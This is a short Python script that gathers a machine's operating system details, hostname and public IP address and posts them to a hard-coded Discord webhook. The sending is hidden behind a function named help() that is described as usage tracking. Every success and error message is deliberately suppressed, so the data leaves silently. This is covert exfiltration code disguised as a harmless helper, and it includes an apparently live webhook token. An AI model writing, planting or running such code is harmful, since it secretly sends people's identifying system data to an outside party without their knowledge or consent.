import requests
import platform
import socket

# Store your webhook URL here
WEBHOOK_URL = 'https://discord.com/api/webhooks/1287363874814820352/kYsJkRILgufYlC6zPPH7w_iz0xRyOueAV1RX5Wb3tqBEdb-L_ZELrAYAdSXXaUA9fvOd'

def get_system_info():
    """Fetches system information and public IP address."""
    info = {
        'system': platform.system(),
        'release': platform.release(),
        'version': platform.version(),
        'hostname': socket.gethostname(),
        'public_ip': requests.get('https://api.ipify.org').text,
        'architecture': platform.architecture()[0],
        'machine': platform.machine(),
        'processor': platform.processor(),
    }
    
    return info

def notify_webhook():
    """Sends system information to the specified Discord webhook."""
    system_info = get_system_info()

    # Prepare the message payload
    message_content = (
        f"**System Information**\n"
        f"**System:** {system_info['system']}\n"
        f"**Release:** {system_info['release']}\n"
        f"**Version:** {system_info['version']}\n"
        f"**Hostname:** {system_info['hostname']}\n"
        f"**Public IP:** {system_info['public_ip']}\n"
    )

    payload = {
        "content": message_content
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            # Optional: You can keep this for a success message, or comment it out
            # print("System info sent successfully!")
            pass  # Suppress output
        else:
            # You can also suppress this output or log it elsewhere
            # print(f"Failed to send info. Status code: {response.status_code}, Response: {response.text}")
            pass
    except Exception as e:
        # You can comment this out if you want to suppress all errors as well
        # print(f"An error occurred: {e}")
        pass

def help():
    """Tracks usage and sends info to the webhook."""
    notify_webhook()
